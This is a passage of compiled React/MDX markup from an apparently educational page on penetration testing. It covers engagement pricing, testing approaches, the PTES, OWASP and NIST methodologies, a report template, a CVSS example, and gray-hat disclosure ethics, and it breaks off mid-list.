              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "10"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "K"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "10K - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7667em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "10"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0715em"
                    },
                    children: "K"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "40K"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Red Team"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full adversary simulation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2-6 weeks"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "50"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "K"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "50K - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7667em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "50"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0715em"
                    },
                    children: "K"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "250K+"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Physical"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Facility security testing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1-2 weeks"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "5"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "K"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "5K - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7667em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "5"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0715em"
                    },
                    children: "K"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "25K"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Social Engineering"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Phishing, pretexting"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1-2 weeks"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "5"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "K"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "5K - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7667em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "5"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0715em"
                    },
                    children: "K"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "20K"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "API Pentest"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "REST, GraphQL, gRPC"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1-2 weeks"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "10"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "K"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "10K - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7667em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "10"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0715em"
                    },
                    children: "K"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "30K"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "IoT/Embedded"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Device firmware, hardware"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2-4 weeks"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "20"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "K"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "20K - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7667em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "20"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0715em"
                    },
                    children: "K"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "60K"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Wireless"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "WiFi, Bluetooth"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1 week"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "5"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "K"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "5K - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7667em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "5"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0715em"
                    },
                    children: "K"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "15K"]
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Testing Approach Comparison:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Approach"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Tester Knowledge"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Black Box"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No prior knowledge of target"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "None"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Gray Box"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Limited knowledge (credentials, docs)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Partial"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "White Box"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full knowledge (source code, architecture)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full"
          })]
        })]
      })]
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Aspect"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Black Box"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Gray Box"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "White Box"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Realism"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Highest (simulates real attacker)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Coverage"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Limited by recon"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Highest"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Time Required"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Most (recon heavy)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Least"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cost"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Highest"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Least"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Find Depth"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Surface-level issues"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Deep logic flaws"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Best For"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "External assessments"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Web apps, APIs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Code review, crypto"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "27-pentest-methodologies",
      children: "2.7 Pentest Methodologies"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "PTES (Penetration Testing Execution Standard):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "1. Pre-engagement Interactions (scoping, legal)\n2. Intelligence Gathering (OSINT, active recon)\n3. Threat Modeling (what matters to target)\n4. Vulnerability Analysis (scanning, manual analysis)\n5. Exploitation (gaining access)\n6. Post-Exploitation (what can you access)\n7. Reporting (document everything)\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "OSSTMM (Open Source Security Testing Methodology Manual):"
      }), "\nFocus on operational security metrics. Key sections:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Information Security Controls"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Process Security Controls"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Internet Technology Controls"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Communications Security Controls"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "OWASP Testing Guide (v4/v5):"
      }), "\nWeb application specific with 12 control categories:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Information Gathering (OTG-INFO)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Configuration and Deployment Management"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Identity Management"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Authentication Testing"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Authorization Testing"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Session Management"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Input Validation"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Error Handling"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Cryptography"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Business Logic"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Client Side"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "API Testing"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "NIST SP 800-115:"
      }), "\nTechnical Guide to Information Security Testing:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Review techniques (document review, pass/fail)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Vulnerability identification (scanning, analysis)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Penetration testing methodologies (discovery, attack, reporting)"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "28-reporting",
      children: "2.8 Reporting"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "A professional pentest report follows a standard structure:"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "┌─────────────────────────────────────────────────┐\n│           PENETRATION TEST REPORT                │\n│           Acme Corporation                       │\n│           Date: December 2024                    │\n├─────────────────────────────────────────────────┤\n│ CONFIDENTIAL - FOR AUTHORIZED RECIPIENTS ONLY   │\n└─────────────────────────────────────────────────┘\n\n1. Executive Summary (1-2 pages)\n   ├── Background and objectives\n   ├── Overall risk rating\n   ├── High-level findings summary\n   ├── Critical vulnerabilities (count)\n   ├── Compromise narrative (how far testers got)\n   └── Strategic recommendations\n\n2. Scope and Methodology\n   ├── In-scope targets\n   ├── Testing dates and times\n   ├── Tools used\n   ├── Methodology reference (PTES, NIST, OWASP)\n   └── Limitations\n\n3. Findings Summary Table\n   ┌────────────┬──────┬──────────┬────────────────┐\n   │ Finding    │ Risk │ CVSS 3.1│ Recommendation │\n   ├────────────┼──────┼──────────┼────────────────┤\n   │ SQLi in    │ Crit │ 9.8     │ Parametrize    │\n   │ /api/users │      │         │ queries        │\n   ├────────────┼──────┼──────────┼────────────────┤\n   │ Default    │ High │ 7.5     │ Disable SSH    │\n   │ SSH creds  │      │         │ password auth  │\n   └────────────┴──────┴──────────┴────────────────┘\n\n4. Detailed Findings\n   For each finding:\n   ├── Title and risk rating\n   ├── CVSS vector string (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)\n   ├── Description of vulnerability\n   ├── Affected systems or endpoints\n   ├── Proof of concept (command executed, screenshot)\n   ├── Impact assessment\n   └── Remediation steps\n\n5. Compromise Narrative (for Red Team engagements)\n   ├── Timeline of attack\n   ├── Attack chain diagram\n   ├── Time to compromise\n   ├── Time to privilege escalation\n   ├── Time to lateral movement\n   └── Time to objective\n\n6. Retest Results (if applicable)\n   ├── Previously identified issues\n   ├── Verification of remediation\n   └── New issues found\n\n7. Appendices\n   ├── Tool output (Nmap scan results, Metasploit sessions)\n   ├── Raw log extracts\n   ├── Screenshots\n   ├── Supporting code or scripts\n   └── Glossary\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "CVSS Scoring Example:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Finding: SQL Injection in /api/users endpoint\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\nBase Score: 9.8 (Critical)\n\nVector Breakdown:\n- AV:N (Network): Exploitable remotely\n- AC:L (Low): No specialized conditions\n- PR:N (None): No authentication required\n- UI:N (None): No user interaction needed\n- S:U (Unchanged): Affects only vulnerable component\n- C:H (High): Full data confidentiality loss\n- I:H (High): Full data integrity loss\n- A:H (High): Full availability loss\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "section-3-gray-hat-hacking",
      children: "Section 3: Gray Hat Hacking"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "31-definition-and-characteristics",
      children: "3.1 Definition and Characteristics"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Gray Hat hackers operate in the ethical and legal gray zone between Black and White Hats. They typically:"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Find vulnerabilities without explicit authorization (like Black Hats)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Disclose them to the vendor (like White Hats)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "May publicly disclose if the vendor is unresponsive (unlike White Hats)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Do not seek financial gain from exploitation (unlike Black Hats)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Often believe they are serving the greater good"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Gray Hat Tactics:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "1. Scan public infrastructure for vulnerabilities\n2. Upon finding one:\n   └── Option A: Notify vendor with PoC (most common)\n   └── Option B: Public disclosure if vendor ignores (controversial)\n   └── Option C: Sell to broker (crosses into Black Hat territory)\n   └── Option D: Patch and move on (rare)\n3. Negotiate timeline with vendor\n4. If no patch in reasonable time → partial disclosure\n5. Full disclosure after patch or vendor refusal\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "32-ethical-dilemmas",
      children: "3.2 Ethical Dilemmas"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "1. Disclosing vs Withholding:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Argument FOR Disclosure"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Argument AGAINST Disclosure"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Users deserve to know"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Gives Black Hats exploit details"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Vendor accountability"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Systems remain unpatched"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Community defense"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Panic before patch available"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Precedent for responsible behavior"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Legal liability risk"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Drives faster patches"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Harms vendor reputation"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "2. Bug Bounty Arbitration:"
      }), "\nWhen a researcher finds a bug but the vendor disagrees on:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Severity:"
        }), " Vendor rates low, researcher rates critical"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Scope:"
        }), " Vendor claims it's out of scope, researcher disagrees"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Duplicate:"
        }), " Vendor says another researcher already reported it"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "p-Hacking:"
        }), " Vendor creates many low-severity findings for same root cause"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "3. Responsible vs Full Disclosure:"
      }), "\nThe debate centers on whether to release full technical details of a vulnerability:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "Responsible Disclosure (Coordinated):"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Private notification to vendor"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Agreed timeline (typically 90 days)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Public disclosure only after patch"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Limited PoC details in public advisory"
          }), "\n"]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "Full Disclosure:"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Immediate public release of all details"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Forces vendor to act quickly"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Controversial, can be reckless"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Supported by some in the security community"
          }), "\n"]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "Hybrid Approach:"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "90-120 day private disclosure window"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "If no fix, release limited details"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
